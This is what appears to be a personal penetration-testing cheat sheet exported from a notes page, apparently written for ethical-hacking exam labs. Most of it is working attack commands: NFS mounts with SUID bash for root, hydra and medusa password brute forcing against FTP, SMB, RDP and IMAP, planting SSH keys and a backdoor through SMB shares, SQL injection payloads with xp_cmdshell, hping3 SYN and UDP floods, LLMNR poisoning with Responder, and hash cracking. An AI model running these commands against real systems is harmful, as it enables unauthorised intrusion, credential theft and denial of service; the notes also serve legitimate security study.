+-t , timeout</code></pre><h2 id="18ab2af3-f9ef-803d-b14d-d32a384cbc48" class="">Service Enumeration</h2><h2 id="259b2af3-f9ef-802c-8dde-d3dfb5d2611b" class="">NFS (nfs 2049 via 111 rpcbind)</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8026-b457-e44505d4d4a5" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exploiting misconfigured NFS (port 2049) 
+nmap -sV —p 2049 IP/Subnet 
+sudo apt-get install nfs-common 
+nmap -sV —script=nfs-showmount &lt;Target_IP&gt; 
+check available mounts:
+showmount -e &lt;Target_IP&gt; we will see /home directory 
+mkdir /tmp/nfs 
+sudo mount -t nfs 10.10.1.9:/home /tmp/nfs 
+cd /tmp/nfs 
+sudo cp /bin/bash . 
+sudo chmod +s bash -&gt; it will be highlighted in red 
+ls -la 
+sudo df -h 
+sudo chmod +s bash
+Access to target using SSH 
+./bash -p 
+cd /home 
+ls -la 
+find / -name &quot;*.txt&quot; -ls 2&gt; /dev/null
+find / -type f -name &quot;Netnormal.txt&quot; 2&gt;/dev/null
+</code></pre><h3 id="18ab2af3-f9ef-80d1-977b-c9a2cfd0612e" class="">FTP</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-809c-a7a1-d2fdb9175e43" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. FTP (21)
+nmap -sCV -p 21 IP
+hydra -l user -P passlist.txt ftp://192.168.0.1
+medusa -h 10.10.10.x -U /root/Documents/user_list.txt -p /root/Documents/pass_list.txt -M ftp -F
+
+common wordlists:
+/usr/share/wordlists/metasploit/common_users.txt
+/usr/share/wordlists/metasploit/unix_passwords.txt
+
+downloading file: get file.txt
+
+wget -m ftp://anonymous:anonymous@&lt;ip&gt;
+wget -m --no-passive ftp://anonymous:anonymous@&lt;ip&gt; 
+
+#Downloading everything
+ftp &lt;target_IP&gt; #connect to FTP service 
+#if you&#x27;ve not credentials, first try anonymous login. 
+Prompt OFF
+binary 
+mget *
+bye</code></pre><h3 id="18ab2af3-f9ef-80c4-af81-f9a3c9264caa" class="">SNMP</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80c7-a5c3-cc73928fd080" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. Using NMAP
+nmap -sU IP
+
+2. snmp-check (gives port too, confirm if 161)
+snmp-check IP
+
+3. processes running on the target machine using nmap scripts
+nmap -sU -p 161 --script=snmp-processes IP
+
+4. finding valid strings using metasploit
+search snmp 
+use auxiliary/scanner/snmp/snmp_login
+set RHOSTS target-IP
+
+5. finding valid strings using nmap scripts
+nmap -sU -p 161 --script=snmp-interfaces IP
+
+NSEDocs Reference Portal - NMAP</code></pre><h3 id="18ab2af3-f9ef-80c2-8bdb-c6345ac2241d" class="">SMB Enumeration</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8013-842c-d5eadbb18764" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. Scan
+nmap IP
+gives port of microsoft-ds (139/tcp or 445/tcp)
+
+sudo nmap -T4 -sS -p 139,445 --script vuln 10.10.55.0/24
+Bruteforce using hydra
+smbclient //IP/share
+smbclient -L IP
+get file.txt ~/Desktop/flag.txt
+
+2. Enumerating Shares (shares details with permissions)
+nmap -p 445 --script smb-enum-shares IP
+
+BRUTEFORCING SMB FOR CREDENTIALS USING NMAP
+nmap --script smb-brute.nse -p445 IP
+
+3. Connect SMB GUI Method
+open file manager --&gt; go to network --&gt; tap on network tab
+smb://IP/
+
+4. Enumerating users
+nmap -p 445 --script smb-enum-users IP
+if it doesnt work
+nmap -p 445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver IP
+
+5. Enumerating groups
+nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver IP
+
+6. Enumerating security levels
+nmap -sC -sV -A -T4 -p445 IP
+
+7. Enumerating services
+nmap -p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver IP
+
+8. End of Life vulnerability CVSS score
+nmap -sV --script=vulners 172.20.0.16
+nmap -sV -p 80,443 172.20.0.16
+
+Nmap sudo nmap -p 445 -sV -sC -O &lt;TARGET_IP&gt; 
+nmap -sU --top-ports 25 --open &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-protocols &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-security-mode &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-sessions &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-sessions --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-shares &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-shares --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-users --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-server-stats --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-domains--script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-groups--script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-services --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=&lt;USER&gt;,smbpassword=&lt;PW&gt; &lt;TARGET_IP&gt; 
+nmap -p 445 --script smb-os-discovery &lt;TARGET_IP&gt; 
+nmap -p445 --script=smb-vuln-* &lt;TARGET_IP&gt;
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt &lt;TARGET_IP&gt; smb 
+smbmap -u guest -p &quot;&quot; -d . -H &lt;TARGET_IP&gt;
+smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -d . -H &lt;TARGET_IP&gt; 
+## Run a command 
+smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -H &lt;TARGET_IP&gt; -x &#x27;ipconfig&#x27; 
+## List all drives 
+smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -H &lt;TARGET_IP&gt; -L 
+## List dir content smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -H &lt;TARGET_IP&gt; -r &#x27;C$&#x27; 
+## Upload a file smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -H &lt;TARGET_IP&gt; --upload &#x27;/root/sample_backdoor&#x27; &#x27;C$\sample_backdoor&#x27; 
+## Download a file 
+smbmap -u &lt;USER&gt; -p &#x27;&lt;PW&gt;&#x27; -H &lt;TARGET_IP&gt; --download &#x27;C$\flag.txt&#x27; 
+
+##Metasploit SMB
+use auxiliary/scanner/smb/smb_version 
+use auxiliary/scanner/smb/smb_enumusers 
+use auxiliary/scanner/smb/smb_enumshares 
+use auxiliary/scanner/smb/smb_login 
+use auxiliary/scanner/smb/pipe_auditor 
+## set options depends on the selected module 
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt 
+set SMBUser &lt;USER&gt; 
+set RHOSTS &lt;TARGET_IP&gt; 
+exploit
+
+##SMB connection
+smbclient -L &lt;TARGET_IP&gt; -N 
+smbclient -L &lt;TARGET_IP&gt; -U &lt;USER&gt; 
+smbclient //&lt;TARGET_IP&gt;/&lt;USER&gt; -U &lt;USER&gt; 
+smbclient //&lt;TARGET_IP&gt;/admin -U admin 
+smbclient //&lt;TARGET_IP&gt;/public -N #NULL Session 
+## SMBCLIENT 
+smbclient //&lt;TARGET_IP&gt;/share_name 
+help 
+ls 
+get &lt;filename&gt;</code></pre><h3 id="18ab2af3-f9ef-8055-98f4-cc45cc93cadb" class="">RDP</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-806c-84d7-e0fa9dec35cd" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Port 3389
+1. Check for running services on the target and confirm if RDP is running on any open port
+Simple nmap scan to check whether there is something on 3389 or RDP service
+nmap IP
+If no, then check all the ports and then verify which one is RDP using msfconsole
+
+2. Use metasploit to confirm the services running is RDP
+use auxiliary/scanner/rdp/rdp_scanner
+SET RHOSTS IP
+set RPORT 3333 (which u found on nmap)
+exploit (will tell u if detected or not)
+
+3. Use hydra to brute force the login credentials
+hydra -L users.txt -P passwords.txt rdp://IP -s PORT
+medusa -h 10.10.10.x -U /root/Documents/user_list.txt -p /root/Documents/pass_list.txt -M ftp -F
+
+wordlists used:
+/usr/share/metasploit-framework/data/wordlists/common_users.txt
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+
+4. Use xfreerdp tool to login into the victim machine
+xfreerdp /u:username /p:password /v:IP:PORT
+
+5. Finding Suspicious Account
+Opening cmd and use: net user
+</code></pre><h2 id="259b2af3-f9ef-80e2-8d1b-f881855eeb74" class="">IMAP</h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-80ef-a5a0-eff761309440" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">#Service Enumerationn
+nmap -p 143,993 -sV 10.10.55.0/24
+#For connecting to the service
+telnet 10.10.55.25 143
+openssl s_client -connect 10.10.55.25:993
+
+#For bruteforcing
+hydra -l &lt;username&gt; -P /usr/share/wordlists/rockyou.txt imap://&lt;IP&gt; -s &lt;port&gt;
+hydra -l admin -P /usr/share/wordlists/rockyou.txt imap://10.10.55.25 -s 143
+#FOR SSL IMAPS
+hydra -l admin -P /usr/share/wordlists/rockyou.txt imaps://10.10.55.25
+
+</code></pre><h3 id="18ab2af3-f9ef-8083-a676-fef09f3d6c40" class="">NetBIOS Enumeration</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-8077-806b-fda74cf7f4af" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Port 137/138/139
+NBName:137/UDP
+NBName:137/TCP
+NBDatagram:138/UDP
+NBSession:139/TCP
+
+1. Checking using NMAP
+nmap -sV --script nbsat.nse IP
+gives us MAC address. workgroup. NetBIOS or Host name and sometimes user.
+nbtscan 10.10.10.0/24
+
+#On windows
+nbtstat -A 10.10.10.16 
+net use 
+net use \10.10.10.16\e &quot;&quot;\user:&quot;&quot; 
+net use \\10.10.10.16\e &quot;&quot; /user:&quot;guest&quot; 
+NetBIOS Enumerator 
+
+#Linux
+smbclient -L //&lt;IP&gt; -U &lt;username&gt;
+#anonymous
+smbclient -L //10.10.10.16 -N
+</code></pre><h1 id="259b2af3-f9ef-80ac-9493-e2136f8f0d40" class="">SMB</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8020-a123-c05458cb6e45" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">nmap -Pn -p139,445 -sV --script smb* 192.168.254.133
+smbclient -L //IP/
+sudo apt install nfs-common -y
+If missing GPG key, use 
+sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 7A8286AF0E81EE4A
+then 
+sudo apt update
+sudo apt install nfs-common -y
+then
+Samba 3.0.20 is vuln to usermap_script which gives root shell
+
+smbmap -u user -p user -H 192.168.254.133
+smbclient //192.168.254.133/user -U user
+Get ssh key or put your own.
+For putting your own, generate one
+ssh-keygen -t rsa -b 2048 -f mykey
+smbclient //192.168.254.133/user -U user -c &quot;cd .ssh; put mykey.pub authorized_keys&quot;
+ssh -i mykey user@192.168.254.133
+
+If not allowed, just get the id_dsa from .ssh (check if placed in authorized keys)
+smbclient //192.168.254.133/user -U user
+get id_dsa
+chmod 600 id_dsa
+ssh -i id_dsa user@IP (if not allowed)
+Unable to negotiate with 192.168.254.133 port 22: no matching host key type found. 
+Their offer: ssh-rsa,ssh-dss
+Just do,
+ssh -i id_dsa -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss user@192.168.254.133
+
+enum4linux -u martin -p apple -U 10.10.10.12 -&gt; Users Enumeration 
+enum4linux -u martin -p apple -o 10.10.10.12 -&gt; OS Enumeration 
+enum4linux -u martin -p apple -P 10.10.10.12 -&gt; Password Policy Information 
+enum4linux -u martin -p apple -G 10.10.10.12 -&gt; Groups Information 
+enum4linux -u martin -p apple -S 10.10.10.12 -&gt; Share Policy Information 
+(SMB Shares Enumeration) </code></pre><h1 id="259b2af3-f9ef-803b-b06f-e165c45e9172" class="">RAT</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-800e-8c0c-e6a544d57823" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Theef default port: 9871, 6703, FTP 2968
+NJRAT default port: 5552
+MoSucker default port: 200005
+ProRat default port: 5110</code></pre><h1 id="259b2af3-f9ef-802f-b0e9-d317a5f1df90" class="">SQLMAP</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8092-be6a-c09cda4248b8" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">#For grabbing cookies
+curl -s -D - https://target.site/ -o /dev/null | grep -i &quot;Set-Cookie:&quot;
+Go to profile and and right cleck and inspect, then 
+In console type “document.cookie” you will get one value.
+
+ wapiti -u &lt;url&gt; -m sql --&gt;&gt; This Will give the vulnerable parameter
+
+sqlmap -u &quot;&quot; --data=&quot;&quot; --cookie=&quot;&quot; 
+sqlmap -u &quot;&quot; --data=&quot;&quot; --cookie=&quot;&quot; --level=5 --risk=3 --random-agent
+
+#For DSSS attack
+sqlmap -u &quot;&quot; --data=&quot;&quot; --cookie=&quot;&quot; --technique=D
+
+
+#Login bypass 
+blah&#x27; or 1=1 -- 
+#Insert data into DB from login 
+blah&#x27;;insert into login values (&#x27;john&#x27;,&#x27;apple123&#x27;); 
+#Create database from login 
+blah&#x27;;create database mydatabase; 
+#Execute cmd from login 
+blah&#x27;;exec master..xp_cmdshell &#x27;ping www.moviescope.com -l 65000 -t&#x27;; --
+
+#RCE - Command Injection
+ping 127.0.0.1 | hostname | net user</code></pre><h1 id="259b2af3-f9ef-803d-b3d7-ec7092aba888" class="">Malware Analysis</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-80be-9e5c-ddc7e8fc9a12" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">PEid for entry point address
+PEView for Image version etc
+Detect it Easy for file info and entry point address
+Can use PE explorer tools as well
+
+#Determine the size of the ## segment using the ### hash method
+sha224sum file
+readelf -l file</code></pre><h1 id="18ab2af3-f9ef-80e7-a67d-f92720273122" class="">Traffic Analysis</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80b2-8a74-c12398345cc7" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">1. SYN filtering packets
+tcp.flags.syn==1
+
+2. Searching for txt files
+Export objects --&gt; content type --&gt; save
+
+3. File comments
+Bottom left corner (file properties)
+has SHA1 and SHA256 hashes and other information
+
+4. Check for specific strings (regex)
+ctrl+f --&gt; enter string
+packet contains
+
+5. Filtering out DOS/DDOS attack IPs
+statistics -- &gt; conversations --&gt; IPv4 --&gt; Bytes (check ipv6 traffic here too)
+if u see 5-10 IPs, select the one which have the large number of packets for DOS
+and for DDOS, choose the ones with the highest number of bytes
+
+6. Least IPv4 packet count sent to the victim machine
+Go to statistics IPv4 addresses--&gt; Source and Destination ---&gt; Then you can apply the 
+filter given 
+tcp.flags.syn == 1 and tcp.flags.ack == 0
+you can find the least number of packets send to 172.22.10.10 address
+
+#SYN DDOS Attack using Hping 
+hping3 -S 1.1.1.6 -a 1.1.1.3 -p 22 --flood 
+1.1.1.6 is target IP 
+1.1.1.3 is the spoof IP 
+22 is port number
+
+#POD - Ping of Death Attack
+hping3 -d 65538 -S -p 21 --flood 1.1.1.6 
+-d is data size 
+-S is syn packets 
+-p is port (you can flood any app with open ports)
+
+#UDP flood attack
+hping3 -2 -p 139 --flood 1.1.1.6 
+-2 is for UDP 
+-p is port
+
+#Identify IoT Message and its Length using capture.cap 
+Filter .cap file on wireshark with &#x27;MQTT&#x27; filter 
+Select packet related to Publish Message 
+Click on MQ Telemetry Transport Protocol -&gt; Header Flags -&gt; Message Msg Len 
+or 
+Click on MQ Telemetry Transport Protocol -&gt; Publish Message -&gt; Msg Len
+OR
+1. Open IOT capture file in wireshark. Filter; MQTT 
+find length of the packet in the lower pane. 
+2. Open in wireshark and apply the filter as mqtt 
+see the public message and then go to down panel open and see the message.
+
+#Sniffing
+http.request.method == &quot;POST&quot; -&gt; Wireshark filter for filtering HTTP POST request 
+Capture traffic from remote interface via wireshark 
+Capture &gt; Options &gt; Manage Interfaces 
+Remote Interface &gt; Add &gt; Host &amp; Port (2002) 
+Username &amp; password &gt; Start</code></pre><h1 id="18ab2af3-f9ef-80b1-afbc-c63e4bf1ad3e" class="">Steganography</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="18ab2af3-f9ef-80de-a386-f8f445c76b70" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Covert TCP - TCP/IP packet headers
+There could be 2 scenarios
+Either you would be provided with the password an simple asked to perform it
+OR you might be asked to use any already enumerated credentials and use it as a password
+
+1. SNOW for Text file, use windows cmd
+Creating a hidden secret file
+SNOW.EXE -C -m &quot;asdasd&quot; -p &quot;password&quot; secret.txt hidden.txt
+.\SNOW.EXE -C -p &quot;password&quot; .\restricted.txt 
+
+Extracting hidden data in txt file
+SNOW.EXE -C -p &quot;password&quot; hidden.txt
+
+2. Openstego for Image File
+for extracting data
+browse input stego file and select output folder for message file (secret)
+if password required, use the previous enumerated ones.
+
+Openstego/ CrytoForge for (.cfe)
+</code></pre><h1 id="259b2af3-f9ef-80e5-9a48-eaac4a083ea4" class=""><strong>LLMNR Poisoning NTML Hash cracking </strong></h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8088-a1da-d0e198db1f86" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Responder: 
+responder -I eth0 -rdwv 
+Copy the hash from responder to ntlmhash.txt 
+and crack it using Hashcat or John
+
+hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0 
+hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt 
+
+john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+john /usr/share/responder/logs/SMB-NTLMv2-SSP-1.1.15.txt </code></pre><h1 id="259b2af3-f9ef-80b2-9f20-c651d1dee427" class="">Entropy/Android</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="259b2af3-f9ef-8051-b0b7-c242715a7f45" class="code code-wrap"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Scan adb port: nmap ip -sV -p 5555 
+sudo apt install adb -y
+Connect 
+adb: adb connect IP:5555 
+Access mobile device: 
+adb shell 
+Elevate privilege using:
+sudo -i (if it is possile) else
+
+pwd--&gt;ls--&gt;cd sdcard/Notifications/Scan--&gt;ls--&gt; cat secret.txt 
+(If you can&#x27;t find, check in others folders) 
+Download files:adb pull /sdcard/Notifications/Scan Do it in another shell, without adb connection!
+We&#x27;ve three elf files, 
+now we need to calcolate entropy for each of them using this command: 
+sudo apt install ent -y
+ent file.elf 
+OR
+python3 -c &quot;import math; f=open(&#x27;myCoolBinary.elf&#x27;,&#x27;rb&#x27;).read(); b=[f.count(bytes([i])) for i in range(256)]; b=[x/len(f) for x in b if x&gt;0]; print(-sum([p*math.log2(p) for p in b]))&quot;
+After selecting file.elf with highest entropy, 
+we need to calculate hash of SHA 384:
+sha384sum file.elf and consider only the last 4 digits of the hash result. 
+
+OR
+
+cd PhoneSploit/
+sudo python phonesploit.py
+(Connect Phone)&gt; IP
